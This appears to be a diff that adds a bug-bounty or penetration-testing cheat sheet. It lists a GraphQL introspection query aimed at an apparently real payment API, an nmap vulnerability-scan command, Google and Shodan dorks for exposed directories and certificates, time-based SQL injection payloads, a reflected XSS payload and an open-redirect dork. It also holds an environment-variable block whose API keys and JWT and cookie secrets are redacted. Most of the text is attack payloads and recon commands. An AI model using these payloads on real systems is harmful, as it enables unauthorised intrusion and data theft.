@@ -1,5 +1,34 @@
+https://api.kivipay.com/graphq?query= {__schema{types{name,fields{name}}}}
+https://xyz.atlassian.net/jira/filters filterView=search&filterView=search&Search=Search&sortColumn=favcount&sortAscending=false
+SENDGRID_API_KEY=███████
+SENDGRID_FROM_EMAIL=████████
+WELCOME_USER_TEMPLATE=███████
+RESET_PASSWORD_TEMPLATE=█████
 
+BCRYPT_SALT=10
+CRYPTO_SECRET=███
 
+JWT_SECRET=████
+JWT_EXPIRE_TIME=30d
+COOKIE_SECRET=██████
+COOKIE_EXPIRE_TIME=30
+ZRT_API_KEY=█████████
+
+:anonymous
+
+nmap -sV -iL subdomains.txt -oN scaned-port.txt --script=vuln
+
+index of / site: /etc/certs + “index of /” */* site:example.com
+example.com/wp-content/uploads/2021/
+example.com/wp-inc/
+
+Ssl.cert.subject.CN:"target.*"+200
+
+user' WAITFOR DELAY '0:0:5'--
+user';WAITFOR DELAY '0:0:5'--
+user' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
+
+url/?color=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
 
 Finding open redirect? use dork to find it
 site:http://target.com inurl:%2f
